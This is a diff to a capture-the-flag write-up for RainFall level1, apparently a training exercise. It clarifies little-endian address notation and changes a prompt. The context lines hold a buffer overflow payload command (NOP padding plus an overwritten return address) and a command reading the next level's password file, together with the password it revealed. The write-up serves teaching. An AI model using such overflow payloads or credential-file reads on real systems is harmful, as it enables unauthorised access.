@@ -55,7 +55,7 @@ We now have the address of run, so we tried to inject in a file 'A' char 76 time
 echo $(python -c "print('\x90'*76+'\x44\x84\x04\x08')") > /tmp/payload
 ```
 
-The address has to be written upside down in order to be understood as a pointer address.
+The address has to be written upside down in order to be understood as a pointer address (this is called Little Endian format).
 Executing it in gdb we get this:
 
 ```sh
@@ -78,6 +78,6 @@ Good... Wait what?
 The - at the end of the cat is to leave stin open, so the shell can be opened.
 
 ```sh
-level1@RainFall:~$ cat /home/user/level2/.pass
+> cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
